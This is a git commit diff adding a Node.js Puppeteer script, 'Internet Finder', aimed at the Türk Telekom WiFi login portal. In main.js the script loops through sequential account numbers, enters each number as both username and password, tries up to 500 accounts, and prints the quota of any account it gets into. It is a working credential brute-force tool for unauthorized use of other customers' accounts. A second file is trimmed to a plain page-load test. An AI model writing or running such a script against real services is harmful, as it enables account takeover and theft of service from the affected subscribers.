7f2c0fd62ba9becd4f59321bc82bee8908dfc278
ShyVaporeon <shyvaporeon@gmail.com>
2021-09-24 23:35:01 +0300

    Internet Finder is finally "complete" :)

--- main.js
+++ main.js
@@ -1,7 +1,121 @@
-const open = require('open');
+const puppeteer = require('puppeteer');
 
-// opens the url in the default browser 
-// open('giris.turktelekomwifi.com/#/welcomeAdsl');
-//  
-//  // specify the app to open in 
-open('giris.turktelekomwifi.com/#/welcomeAdsl', {app: 'vivaldi'});
+// skips first two numbers
+var user = 2110337;
+var howManyTrys = 500;
+
+var accountFound = false;
+const url = "https://giris.turktelekomwifi.com/#/login/adsl";
+
+const TTMusteri_Button = "#accordingMenuButton";
+const Internet_Button = "#according-menu > button:nth-child(1)"
+const InternetGiris_Button = "#adslBtn"
+
+const checkBox = 'input[name="termsCheckBox"]';
+const userName_InputField = "#adslUsername";
+const password_InputField = 'input[name="password"]';
+const login_Button = "#loginBtn:not([disabled])";
+
+const exitButton = "a[data-autamation=\"cikis\"]";
+const tableContent = "td.alert-link"
+
+async function findInternet(){
+
+	const page = await startBrowser();
+
+	while (howManyTrys !== 0) {
+
+        try {
+            await fillForm(page);	
+        } catch (error) {
+            await exitAccount(page);
+        }
+	
+		await showQuota(page);
+        await navigateSite(page);
+	}
+}
+
+async function startBrowser(){
+
+	const browser = await puppeteer.launch({
+		headless: true,
+		defaultViewport: null
+		//slowMo: 100 //slow down every action by 100ms 
+	});
+
+	const _page = await browser.newPage();
+
+	await _page.goto(url,{
+		waitUntil: "domcontentloaded"
+	});
+	return _page;
+}
+
+
+async function navigateSite(page){
+
+	await page.waitForSelector(TTMusteri_Button);
+	await page.click(TTMusteri_Button);
+
+	await page.waitForSelector(Internet_Button);
+	await page.click(Internet_Button);
+
+	await page.waitForSelector(InternetGiris_Button);
+	await page.click(InternetGiris_Button);
+}
+
+async function fillForm(page){
+
+	await page.waitForSelector(checkBox);
+	await page.click(checkBox);
+
+	while (!accountFound && (howManyTrys !== 0)) {
+
+		howManyTrys -= 1;
+		user += 1;
+        console.log(user);
+
+	    // clear input field
+		async function clear(page, selector) {
+			await page.evaluate(selector => {
+			document.querySelector(selector).value = "";
+			}, selector);
+		}
+
+		await page.waitForSelector(userName_InputField);
+		await page.waitForSelector(password_InputField);
+
+		await clear(page, userName_InputField);
+		await clear(page, password_InputField);
+
+		await page.type(userName_InputField, user.toString());
+		await page.type(password_InputField, user.toString());		
+
+		await page.waitForSelector(login_Button, {timeout:4000});
+		await page.click(login_Button);
+	}
+
+}
+
+async function exitAccount(page){
+
+	await page.waitForSelector(exitButton);
+	page.click(exitButton);
+
+	accountFound = false;
+    await setTimeout(() => {console.log("exiting")},2000);
+    //await page.goto(url);
+}
+
+async function showQuota(page) {
+
+	await page.waitForSelector(tableContent);
+    const table = await page.evaluate(async() => {
+        const tds = Array.from(document.querySelectorAll("td.alert-link"))
+        return tds.map(td => td.innerText)
+    });
+    console.log(table);
+}
+
+findInternet();
--- puppeteer.js
+++ puppeteer.js
@@ -1,63 +1,18 @@
-const puppeteer = require('puppeteer');
+const puppeteer = require("puppeteer");
 
-async function findInternet(){
-
-	//startBrowser();
-
-	const url = "https://giris.turktelekomwifi.com/#/welcomeAdsl";
+(async () => {
+	const url = "https://en.wikipedia.org/wiki/English_language";
 	
 	const browser = await puppeteer.launch({
 		headless: true,
 		defaultViewport: null
 	});
-
 	const page = await browser.newPage();
+	
 
 	await page.goto(url,{
 		waitUntil: "domcontentloaded"
 	});
 
-	//navigateSite(page);
-
-	//fillForm(page);	
-
-	showQuota(page);
-
-	//exitAccount(page);
-
-}
-
-/* async function startBrowser(){
-
-} */
-
-
-async function navigateSite(page){
-
-}
-
-async function fillForm(page){
-
-}
-
-async function exitAccount(page){
-	const exitButton = "data-autamation=\"cikis\"";
-
-}
-
-
-async function showQuota(page) {
-
-	const quota_remainging = ".table tbody tr td:first-child"
-	const quota_total = ".table tbody tr td:nth-child(2)"
-	await page.waitForSelector(quota_total, {
-		visible: true,
-	  });
-
-	const Message1 =  await page.$eval(quota_total, result => result.textContent);
-	const Message2 =  await page.$eval(quota_remainging, result => result.textContent);
-	console.log("Quota: "+Message1);
-	console.log("Remaining: "+Message2);
-}
-
-findInternet();
+	await browser.close();
+})();
